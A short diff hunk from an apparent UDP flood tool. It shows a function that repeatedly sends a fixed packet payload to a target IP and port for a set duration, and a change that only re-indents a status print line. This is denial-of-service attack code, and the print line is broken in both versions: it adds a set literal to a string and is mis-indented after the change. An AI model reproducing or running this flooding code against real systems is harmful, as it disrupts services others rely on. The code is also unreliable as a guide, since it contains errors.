@@ -25,7 +25,7 @@ def udp_plain_flood(ip, port, duration, packet_size):
     packet_count = 0
     payload = b"A" * packet_size  # Fixed payload
 
-    print({Fore.LIGHTBLUE_EX} + f"[*] Starting UDP Plain flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
+        print({Fore.LIGHTBLUE_EX} + f"[*] Starting UDP Plain flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
     try:
         while time.time() < end_time:
             sock.sendto(payload, (ip, port))
